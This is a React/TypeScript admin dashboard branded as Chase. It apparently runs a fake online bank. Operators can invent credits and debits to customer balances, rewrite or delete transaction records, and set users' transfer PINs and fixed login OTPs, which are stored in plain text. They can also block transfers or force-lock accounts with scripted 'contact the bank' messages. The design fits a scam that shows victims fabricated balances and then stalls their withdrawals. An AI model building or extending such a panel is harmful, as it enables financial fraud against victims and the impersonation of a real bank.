import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useCallback, useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { getMyRoles, signOut } from "@/lib/auth";

export const Route = createFileRoute("/admin/")({
  component: AdminDashboard,
  head: () => ({
    meta: [{ title: "Admin — Chase" }, { name: "description", content: "Manage users and transactions." }],
  }),
});

const NAVY = "#0b1f33";
const CHASE_BLUE = "#117ACA";

type Profile = {
  id: string;
  full_name: string | null;
  email: string;
  phone: string | null;
  address: string | null;
  account_number: string;
  balance_cents: number;
  transfer_pin: string | null;
  transfers_disabled: boolean;
  login_otp: string | null;
  force_logout: boolean;
  created_at: string;
};

type Txn = {
  id: string;
  user_id: string;
  type: "credit" | "debit";
  amount_cents: number;
  description: string;
  balance_after_cents: number;
  status: "pending" | "completed" | "failed" | "reversed";
  created_at: string;
};


const usd = (c: number) =>
  (c / 100).toLocaleString("en-US", { style: "currency", currency: "USD" });

function AdminDashboard() {
  const navigate = useNavigate();
  const [authorized, setAuthorized] = useState(false);
  const [profiles, setProfiles] = useState<Profile[]>([]);
  const [selected, setSelected] = useState<Profile | null>(null);
  const [txns, setTxns] = useState<Txn[]>([]);
  const [search, setSearch] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    (async () => {
      const roles = await getMyRoles();
      if (!roles.includes("admin")) {
        navigate({ to: "/admin/login" });
        return;
      }
      setAuthorized(true);
    })();
  }, [navigate]);

  const loadProfiles = useCallback(async () => {
    setLoading(true);
    const { data } = await supabase
      .from("profiles")
      .select("*")
      .order("created_at", { ascending: false });
    setProfiles((data as Profile[]) ?? []);
    setLoading(false);
  }, []);

  const loadTxns = useCallback(async (userId: string) => {
    const { data } = await supabase
      .from("transactions")
      .select("*")
      .eq("user_id", userId)
      .order("created_at", { ascending: false });
    setTxns((data as Txn[]) ?? []);
  }, []);

  useEffect(() => {
    if (authorized) loadProfiles();
  }, [authorized, loadProfiles]);

  useEffect(() => {
    if (selected) loadTxns(selected.id);
    else setTxns([]);
  }, [selected, loadTxns]);

  const filtered = useMemo(() => {
    const q = search.trim().toLowerCase();
    if (!q) return profiles;
    return profiles.filter(
      (p) =>
        p.email.toLowerCase().includes(q) ||
        (p.full_name ?? "").toLowerCase().includes(q) ||
        p.account_number.includes(q),
    );
  }, [profiles, search]);

  if (!authorized) {
    return (
      <main className="min-h-screen flex items-center justify-center text-neutral-600">
        Checking permissions…
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-neutral-100">
      <header
        className="px-4 sm:px-6 py-3 sm:py-4 flex items-center justify-between text-white"
        style={{ backgroundColor: NAVY }}
      >
        <div className="flex items-center gap-3 min-w-0">
          {selected && (
            <button
              onClick={() => setSelected(null)}
              className="lg:hidden p-1 -ml-1"
              aria-label="Back to users"
            >
              <svg viewBox="0 0 24 24" className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2">
                <polyline points="15 6 9 12 15 18" />
              </svg>
            </button>
          )}
          <Logo />
          <div className="min-w-0">
            <div className="text-[15px] sm:text-[16px] font-semibold leading-none truncate">Chase Admin</div>
            <div className="text-[11px] sm:text-[12px] text-blue-200 mt-1 hidden sm:block">Internal console</div>
          </div>
        </div>
        <button
          onClick={async () => {
            await signOut();
            navigate({ to: "/admin/login" });
          }}
          className="text-[13px] sm:text-[14px] font-semibold underline whitespace-nowrap"
        >
          Sign out
        </button>
      </header>

      <div className="max-w-7xl mx-auto p-3 sm:p-4 lg:p-6 grid lg:grid-cols-[360px_1fr] gap-3 sm:gap-4">
        {/* Users list */}
        <aside
          className={`bg-white rounded-lg shadow-sm flex-col lg:h-[calc(100vh-110px)] max-h-[calc(100vh-130px)] ${
            selected ? "hidden lg:flex" : "flex"
          }`}
        >
          <div className="p-3 sm:p-4 border-b border-neutral-200">
            <h2 className="text-[16px] sm:text-[18px] font-semibold text-neutral-900">Users</h2>
            <input
              placeholder="Search name, email, account…"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="mt-3 w-full border border-neutral-300 rounded px-3 py-2 text-[14px] outline-none focus:border-neutral-500"
            />
          </div>
          <div className="overflow-y-auto flex-1 divide-y divide-neutral-100">
            {loading && <div className="p-4 text-sm text-neutral-500">Loading…</div>}
            {!loading && filtered.length === 0 && (
              <div className="p-4 text-sm text-neutral-500">No users found.</div>
            )}
            {filtered.map((p) => {
              const active = selected?.id === p.id;
              return (
                <button
                  key={p.id}
                  onClick={() => setSelected(p)}
                  className={`w-full text-left px-4 py-3 hover:bg-neutral-50 ${active ? "bg-blue-50" : ""}`}
                >
                  <div className="text-[15px] font-medium text-neutral-900 truncate">
                    {p.full_name || "(no name)"}
                  </div>
                  <div className="text-[13px] text-neutral-600 truncate">{p.email}</div>
                  <div className="flex items-center justify-between mt-1 gap-2">
                    <span className="text-[12px] text-neutral-500">
                      Acct ••• {p.account_number.slice(-4)}
                    </span>
                    <span className="text-[13px] font-semibold whitespace-nowrap" style={{ color: CHASE_BLUE }}>
                      {usd(p.balance_cents)}
                    </span>
                  </div>
                </button>
              );
            })}
          </div>
        </aside>

        {/* Detail panel */}
        <section
          className={`bg-white rounded-lg shadow-sm min-h-[calc(100vh-130px)] lg:min-h-[calc(100vh-110px)] ${
            selected ? "block" : "hidden lg:block"
          }`}
        >
          {!selected ? (
            <div className="h-full flex items-center justify-center text-neutral-500 p-10 text-center">
              Select a user to manage their account and transactions.
            </div>
          ) : (
            <UserDetail
              key={selected.id}
              user={selected}
              txns={txns}
              onChanged={async () => {
                await loadProfiles();
                const { data } = await supabase
                  .from("profiles")
                  .select("*")
                  .eq("id", selected.id)
                  .maybeSingle();
                if (data) setSelected(data as Profile);
                await loadTxns(selected.id);
              }}
            />
          )}
        </section>
      </div>
    </main>
  );
}

type Account = {
  id: string;
  user_id: string;
  kind: "checking" | "savings" | "credit" | "loan";
  name: string;
  account_number: string;
  balance_cents: number;
};

function UserDetail({
  user,
  txns,
  onChanged,
}: {
  user: Profile;
  txns: Txn[];
  onChanged: () => Promise<void>;
}) {
  const [accounts, setAccounts] = useState<Account[]>([]);
  const [accountId, setAccountId] = useState<string>("");
  const [amount, setAmount] = useState("");
  const [desc, setDesc] = useState("");
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState<{ kind: "ok" | "err"; text: string } | null>(null);

  const loadAccounts = useCallback(async () => {
    const { data } = await supabase
      .from("accounts")
      .select("*")
      .eq("user_id", user.id)
      .order("created_at", { ascending: true });
    const list = (data as Account[]) ?? [];
    setAccounts(list);
    setAccountId((prev) => prev && list.some((a) => a.id === prev) ? prev : list[0]?.id ?? "");
  }, [user.id]);

  useEffect(() => {
    loadAccounts();
  }, [loadAccounts]);

  const refresh = async () => {
    await Promise.all([loadAccounts(), onChanged()]);
  };

  const apply = async (type: "credit" | "debit") => {
    setMsg(null);
    const account = accounts.find((a) => a.id === accountId);
    if (!account) {
      setMsg({ kind: "err", text: "Select an account." });
      return;
    }
    const dollars = parseFloat(amount);
    if (!dollars || dollars <= 0) {
      setMsg({ kind: "err", text: "Enter a positive amount." });
      return;
    }
    const cents = Math.round(dollars * 100);
    setBusy(true);
    try {
      const newBalance =
        type === "credit" ? account.balance_cents + cents : account.balance_cents - cents;
      if (newBalance < 0 && account.kind !== "credit" && account.kind !== "loan") {
        throw new Error("Insufficient balance for debit.");
      }

      const { data: { user: admin } } = await supabase.auth.getUser();
      const { error: txErr } = await supabase.from("transactions").insert({
        user_id: user.id,
        account_id: account.id,
        type,
        amount_cents: cents,
        description: desc || (type === "credit" ? "Admin credit" : "Admin debit"),
        balance_after_cents: newBalance,
        created_by: admin?.id,
      });
      if (txErr) throw txErr;

      const { error: aErr } = await supabase
        .from("accounts")
        .update({ balance_cents: newBalance })
        .eq("id", account.id);
      if (aErr) throw aErr;

      setAmount("");
      setDesc("");
      setMsg({ kind: "ok", text: `${type === "credit" ? "Credited" : "Debited"} ${usd(cents)} on ${account.name}.` });
      await refresh();
    } catch (e) {
      setMsg({ kind: "err", text: e instanceof Error ? e.message : "Failed." });
    } finally {
      setBusy(false);
    }
  };

  const totalAssets = accounts
    .filter((a) => a.kind === "checking" || a.kind === "savings")
    .reduce((sum, a) => sum + a.balance_cents, 0);

  return (
    <div className="p-6">
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h2 className="text-[22px] font-semibold text-neutral-900">
            {user.full_name || "(no name)"}
          </h2>
          <div className="text-[14px] text-neutral-600 mt-1">{user.email}</div>
          <div className="text-[13px] text-neutral-500 mt-1">
            Account {user.account_number} · {user.phone || "no phone"}
          </div>
          {user.address && (
            <div className="text-[13px] text-neutral-500 mt-0.5">{user.address}</div>
          )}
        </div>
        <div className="text-right">
          <div className="text-[12px] uppercase tracking-wide text-neutral-500">Total deposits</div>
          <div className="text-[32px] font-semibold" style={{ color: CHASE_BLUE }}>
            {usd(totalAssets)}
          </div>
        </div>
      </div>

      <ProfileEditor user={user} onChanged={onChanged} />

      <h3 className="mt-8 text-[16px] font-semibold text-neutral-900">Accounts</h3>
      <div className="mt-2 grid sm:grid-cols-2 gap-3">
        {accounts.map((a) => (
          <div
            key={a.id}
            className={`border rounded p-3 ${accountId === a.id ? "border-blue-500 bg-blue-50" : "border-neutral-200"}`}
          >
            <div className="flex items-center justify-between">
              <div>
                <div className="text-[14px] font-semibold text-neutral-900">{a.name}</div>
                <div className="text-[12px] text-neutral-500 capitalize">{a.kind} · ••• {a.account_number.slice(-4)}</div>
              </div>
              <div className="text-[16px] font-semibold" style={{ color: a.balance_cents < 0 ? "#b3261e" : "#171717" }}>
                {usd(a.balance_cents)}
              </div>
            </div>
            <button
              onClick={() => setAccountId(a.id)}
              className="mt-2 text-[12px] font-semibold"
              style={{ color: CHASE_BLUE }}
            >
              {accountId === a.id ? "Selected" : "Select"}
            </button>
          </div>
        ))}
        {accounts.length === 0 && (
          <div className="text-[13px] text-neutral-500">No accounts.</div>
        )}
      </div>

      <div className="mt-6 grid sm:grid-cols-[1fr_1fr_auto_auto] gap-3 items-end bg-neutral-50 p-4 rounded border border-neutral-200">
        <label className="block sm:col-span-2">
          <span className="text-[13px] text-neutral-700">Account</span>
          <select
            value={accountId}
            onChange={(e) => setAccountId(e.target.value)}
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none bg-white"
          >
            {accounts.map((a) => (
              <option key={a.id} value={a.id}>
                {a.name} ({usd(a.balance_cents)})
              </option>
            ))}
          </select>
        </label>
        <label className="block">
          <span className="text-[13px] text-neutral-700">Amount (USD)</span>
          <input
            type="number"
            min="0"
            step="0.01"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none"
          />
        </label>
        <label className="block">
          <span className="text-[13px] text-neutral-700">Description</span>
          <input
            value={desc}
            onChange={(e) => setDesc(e.target.value)}
            placeholder="Optional note"
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none"
          />
        </label>
        <button
          onClick={() => apply("credit")}
          disabled={busy}
          className="px-4 py-2 text-white text-[14px] font-semibold rounded disabled:opacity-60"
          style={{ backgroundColor: "#0a7d3e" }}
        >
          Credit
        </button>
        <button
          onClick={() => apply("debit")}
          disabled={busy}
          className="px-4 py-2 text-white text-[14px] font-semibold rounded disabled:opacity-60"
          style={{ backgroundColor: "#b3261e" }}
        >
          Debit
        </button>
      </div>

      {msg && (
        <p
          className={`mt-3 text-[13px] ${msg.kind === "ok" ? "text-green-700" : "text-red-700"}`}
        >
          {msg.text}
        </p>
      )}

      <h3 className="mt-8 text-[16px] font-semibold text-neutral-900">Transactions</h3>
      <div className="mt-2 overflow-x-auto">
        <table className="w-full text-[14px] border-collapse">
          <thead>
            <tr className="text-left text-neutral-600 border-b border-neutral-200">
              <th className="py-2 pr-3">Date</th>
              <th className="py-2 pr-3">Type</th>
              <th className="py-2 pr-3">Description</th>
              <th className="py-2 pr-3 text-right">Amount</th>
              <th className="py-2 pr-3 text-right">Balance after</th>
              <th className="py-2 pr-3">Status</th>
              <th className="py-2 pr-3"></th>
            </tr>
          </thead>
          <tbody>
            {txns.length === 0 && (
              <tr>
                <td colSpan={7} className="py-6 text-center text-neutral-500">
                  No transactions yet.
                </td>
              </tr>
            )}

            {txns.map((t) => (
              <TxnRow key={t.id} txn={t} onChanged={onChanged} />
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}

function TxnRow({ txn, onChanged }: { txn: Txn; onChanged: () => Promise<void> }) {
  const [editing, setEditing] = useState(false);
  const [desc, setDesc] = useState(txn.description);
  const [amount, setAmount] = useState((txn.amount_cents / 100).toFixed(2));
  const [busy, setBusy] = useState(false);

  const save = async () => {
    setBusy(true);
    try {
      const cents = Math.round(parseFloat(amount) * 100);
      if (!cents || cents <= 0) throw new Error("Invalid amount");
      await supabase
        .from("transactions")
        .update({ description: desc, amount_cents: cents })
        .eq("id", txn.id);
      setEditing(false);
      await onChanged();
    } catch (e) {
      alert(e instanceof Error ? e.message : "Failed");
    } finally {
      setBusy(false);
    }
  };

  const remove = async () => {
    if (!confirm("Delete this transaction? Balance will NOT be auto-recomputed.")) return;
    await supabase.from("transactions").delete().eq("id", txn.id);
    await onChanged();
  };

  return (
    <tr className="border-b border-neutral-100">
      <td className="py-2 pr-3 text-neutral-700 whitespace-nowrap">
        {new Date(txn.created_at).toLocaleDateString()}
      </td>
      <td className="py-2 pr-3">
        <span
          className="px-2 py-0.5 text-[12px] rounded font-semibold"
          style={{
            backgroundColor: txn.type === "credit" ? "#e6f4ea" : "#fde7e9",
            color: txn.type === "credit" ? "#0a7d3e" : "#b3261e",
          }}
        >
          {txn.type}
        </span>
      </td>
      <td className="py-2 pr-3">
        {editing ? (
          <input
            value={desc}
            onChange={(e) => setDesc(e.target.value)}
            className="border border-neutral-300 rounded px-2 py-1 w-full"
          />
        ) : (
          txn.description || <span className="text-neutral-400">—</span>
        )}
      </td>
      <td className="py-2 pr-3 text-right font-semibold">
        {editing ? (
          <input
            type="number"
            step="0.01"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            className="border border-neutral-300 rounded px-2 py-1 w-24 text-right"
          />
        ) : (
          <span style={{ color: txn.type === "credit" ? "#0a7d3e" : "#1a1a1a" }}>
            {txn.type === "credit" ? "+" : "−"}
            {usd(txn.amount_cents)}
          </span>
        )}
      </td>
      <td className="py-2 pr-3 text-right text-neutral-700">{usd(txn.balance_after_cents)}</td>
      <td className="py-2 pr-3">
        <StatusCell txn={txn} onChanged={onChanged} />
      </td>
      <td className="py-2 pr-3 text-right whitespace-nowrap">

        {editing ? (
          <>
            <button
              onClick={save}
              disabled={busy}
              className="text-[13px] font-semibold mr-3"
              style={{ color: CHASE_BLUE }}
            >
              Save
            </button>
            <button onClick={() => setEditing(false)} className="text-[13px] text-neutral-600">
              Cancel
            </button>
          </>
        ) : (
          <>
            <button
              onClick={() => setEditing(true)}
              className="text-[13px] font-semibold mr-3"
              style={{ color: CHASE_BLUE }}
            >
              Edit
            </button>
            <button onClick={remove} className="text-[13px] text-red-700">
              Delete
            </button>
          </>
        )}
      </td>
    </tr>
  );
}

function Logo() {
  return (
    <svg viewBox="0 0 40 40" className="w-8 h-8">
      <g fill="#fff">
        <rect x="17" y="3" width="6" height="14" rx="1" />
        <rect x="23" y="17" width="14" height="6" rx="1" />
        <rect x="17" y="23" width="6" height="14" rx="1" />
        <rect x="3" y="17" width="14" height="6" rx="1" />
      </g>
    </svg>
  );
}

function ProfileEditor({ user, onChanged }: { user: Profile; onChanged: () => Promise<void> }) {
  const [fullName, setFullName] = useState(user.full_name ?? "");
  const [phone, setPhone] = useState(user.phone ?? "");
  const [address, setAddress] = useState(user.address ?? "");
  const [pin, setPin] = useState(user.transfer_pin ?? "");
  const [loginOtp, setLoginOtp] = useState(user.login_otp ?? "");
  const [transfersDisabled, setTransfersDisabled] = useState(!!user.transfers_disabled);
  const [togglingTransfers, setTogglingTransfers] = useState(false);
  const [forceLogout, setForceLogout] = useState(!!user.force_logout);
  const [togglingLogout, setTogglingLogout] = useState(false);
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);

  const save = async () => {
    setBusy(true);
    setMsg(null);
    try {
      const trimmedPin = pin.trim();
      if (trimmedPin && !/^\d{4,6}$/.test(trimmedPin)) {
        throw new Error("Transfer PIN must be 4–6 digits.");
      }
      const trimmedOtp = loginOtp.trim();
      if (trimmedOtp && !/^\d{6}$/.test(trimmedOtp)) {
        throw new Error("Login OTP must be exactly 6 digits.");
      }
      const { error } = await supabase
        .from("profiles")
        .update({
          full_name: fullName.trim(),
          phone: phone.trim(),
          address: address.trim(),
          transfer_pin: trimmedPin || null,
          login_otp: trimmedOtp || null,
        })
        .eq("id", user.id);
      if (error) throw error;
      setMsg("Profile updated.");
      await onChanged();
    } catch (e) {
      setMsg(e instanceof Error ? e.message : "Failed to update profile.");
    } finally {
      setBusy(false);
    }
  };

  const toggleTransfers = async () => {
    const next = !transfersDisabled;
    setTogglingTransfers(true);
    setMsg(null);
    try {
      const { error } = await supabase
        .from("profiles")
        .update({ transfers_disabled: next })
        .eq("id", user.id);
      if (error) throw error;
      setTransfersDisabled(next);
      setMsg(next ? "Transfers disabled for this user." : "Transfers enabled for this user.");
      await onChanged();
    } catch (e) {
      setMsg(e instanceof Error ? e.message : "Failed to update transfers flag.");
    } finally {
      setTogglingTransfers(false);
    }
  };

  const toggleForceLogout = async () => {
    const next = !forceLogout;
    setTogglingLogout(true);
    setMsg(null);
    try {
      const { error } = await supabase
        .from("profiles")
        .update({ force_logout: next })
        .eq("id", user.id);
      if (error) throw error;
      setForceLogout(next);
      setMsg(
        next
          ? "Auto-logout enabled. User will be signed out and shown the locked screen."
          : "Auto-logout disabled. User can sign in again.",
      );
      await onChanged();
    } catch (e) {
      setMsg(e instanceof Error ? e.message : "Failed to update auto-logout flag.");
    } finally {
      setTogglingLogout(false);
    }
  };

  return (
    <div className="mt-6 bg-neutral-50 p-4 rounded border border-neutral-200">
      <h3 className="text-[15px] font-semibold text-neutral-900">Edit profile</h3>
      <div className="mt-3 grid sm:grid-cols-3 gap-3">
        <label className="block">
          <span className="text-[13px] text-neutral-700">Full name</span>
          <input
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            maxLength={120}
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none"
          />
        </label>
        <label className="block">
          <span className="text-[13px] text-neutral-700">Phone</span>
          <input
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            maxLength={40}
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none"
          />
        </label>
        <label className="block">
          <span className="text-[13px] text-neutral-700">Address</span>
          <input
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            maxLength={240}
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none"
          />
        </label>
        <label className="block">
          <span className="text-[13px] text-neutral-700">
            Transfer PIN <span className="text-neutral-500">(4–6 digits)</span>
          </span>
          <input
            value={pin}
            onChange={(e) => setPin(e.target.value.replace(/\D/g, "").slice(0, 6))}
            inputMode="numeric"
            placeholder="Not set"
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none tracking-widest"
          />
          <span className="text-[11px] text-neutral-500 mt-1 block">
            Required for the user to submit transfers. Clear to remove.
          </span>
        </label>
        <label className="block">
          <span className="text-[13px] text-neutral-700">
            Login OTP <span className="text-neutral-500">(6 digits)</span>
          </span>
          <input
            value={loginOtp}
            onChange={(e) => setLoginOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
            inputMode="numeric"
            placeholder="Not set"
            className="mt-1 w-full border border-neutral-300 rounded px-3 py-2 text-[15px] outline-none tracking-widest"
          />
          <span className="text-[11px] text-neutral-500 mt-1 block">
            User must enter this code on the identification screen after sign in. Clear to remove.
          </span>
        </label>
      </div>
      <div className="mt-3 flex items-center gap-3">
        <button
          onClick={save}
          disabled={busy}
          className="px-4 py-2 text-white text-[14px] font-semibold rounded disabled:opacity-60"
          style={{ backgroundColor: CHASE_BLUE }}
        >
          {busy ? "Saving…" : "Save profile"}
        </button>
        {msg && <span className="text-[13px] text-neutral-700">{msg}</span>}
      </div>

      <div className="mt-5 pt-4 border-t border-neutral-200">
        <div className="flex items-start justify-between gap-4 flex-wrap">
          <div>
            <div className="text-[14px] font-semibold text-neutral-900">Outgoing transfers</div>
            <div className="text-[12px] text-neutral-600 mt-0.5 max-w-md">
              When disabled, the user will see "Transfer disabled. Contact bank for more support."
              after entering their PIN on the transfer page.
            </div>
            <div
              className="mt-2 inline-block px-2 py-0.5 rounded text-[11px] font-semibold uppercase tracking-wide"
              style={{
                backgroundColor: transfersDisabled ? "#fde7e9" : "#e6f4ea",
                color: transfersDisabled ? "#b3261e" : "#0a7d3e",
              }}
            >
              {transfersDisabled ? "Disabled" : "Enabled"}
            </div>
          </div>
          <button
            onClick={toggleTransfers}
            disabled={togglingTransfers}
            className="px-4 py-2 text-white text-[14px] font-semibold rounded disabled:opacity-60"
            style={{ backgroundColor: transfersDisabled ? "#0a7d3e" : "#b3261e" }}
          >
            {togglingTransfers
              ? "Saving…"
              : transfersDisabled
                ? "Enable transfers"
                : "Disable transfers"}
          </button>
        </div>
      </div>

      <div className="mt-5 pt-4 border-t border-neutral-200">
        <div className="flex items-start justify-between gap-4 flex-wrap">
          <div>
            <div className="text-[14px] font-semibold text-neutral-900">Auto-logout (lock account)</div>
            <div className="text-[12px] text-neutral-600 mt-0.5 max-w-md">
              When enabled, the user is signed out within seconds no matter what they're doing,
              and shown: "Account has been locked for security reasons contact the bank."
            </div>
            <div
              className="mt-2 inline-block px-2 py-0.5 rounded text-[11px] font-semibold uppercase tracking-wide"
              style={{
                backgroundColor: forceLogout ? "#fde7e9" : "#e6f4ea",
                color: forceLogout ? "#b3261e" : "#0a7d3e",
              }}
            >
              {forceLogout ? "Locked" : "Active"}
            </div>
          </div>
          <button
            onClick={toggleForceLogout}
            disabled={togglingLogout}
            className="px-4 py-2 text-white text-[14px] font-semibold rounded disabled:opacity-60"
            style={{ backgroundColor: forceLogout ? "#0a7d3e" : "#b3261e" }}
          >
            {togglingLogout
              ? "Saving…"
              : forceLogout
                ? "Unlock account"
                : "Lock & log out user"}
          </button>
        </div>
      </div>
    </div>
  );
}

const STATUS_COLORS: Record<Txn["status"], { bg: string; fg: string }> = {
  pending: { bg: "#fef3c7", fg: "#92400e" },
  completed: { bg: "#e6f4ea", fg: "#0a7d3e" },
  failed: { bg: "#fde7e9", fg: "#b3261e" },
  reversed: { bg: "#e5e7eb", fg: "#374151" },
};

function StatusCell({ txn, onChanged }: { txn: Txn; onChanged: () => Promise<void> }) {
  const [busy, setBusy] = useState(false);
  const colors = STATUS_COLORS[txn.status];

  const update = async (status: Txn["status"]) => {
    if (status === txn.status) return;
    setBusy(true);
    try {
      const { error } = await supabase
        .from("transactions")
        .update({ status })
        .eq("id", txn.id);
      if (error) throw error;
      await onChanged();
    } catch (e) {
      alert(e instanceof Error ? e.message : "Failed");
    } finally {
      setBusy(false);
    }
  };

  return (
    <select
      value={txn.status}
      disabled={busy}
      onChange={(e) => update(e.target.value as Txn["status"])}
      className="text-[12px] font-semibold rounded px-2 py-1 border-0 outline-none cursor-pointer"
      style={{ backgroundColor: colors.bg, color: colors.fg }}
    >
      <option value="pending">pending</option>
      <option value="completed">completed</option>
      <option value="failed">failed</option>
      <option value="reversed">reversed</option>
    </select>
  );
}

